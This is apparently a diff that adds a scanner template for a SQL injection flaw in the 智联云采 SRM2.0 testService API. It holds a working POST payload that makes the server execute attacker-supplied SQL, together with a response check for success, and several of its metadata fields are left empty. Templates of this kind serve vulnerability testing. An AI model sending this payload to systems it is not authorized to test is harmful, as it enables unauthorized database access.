@@ -1,0 +1,28 @@
+id:
+info:
+  name: 智联云采 SRM2.0 testService SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /adpweb/a/ica/api/testService
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/json
+  data: |
+    {
+        "dbId": "1001",
+        "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
+        "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+        "serviceCode": "q",
+        "serviceName": "q",
+        "serviceParams": "{\"lang\":\"zh_CN\"}"
+    }
+response1:
+  body: "执行成功"
+  code: 200
+requests2:
+response2:
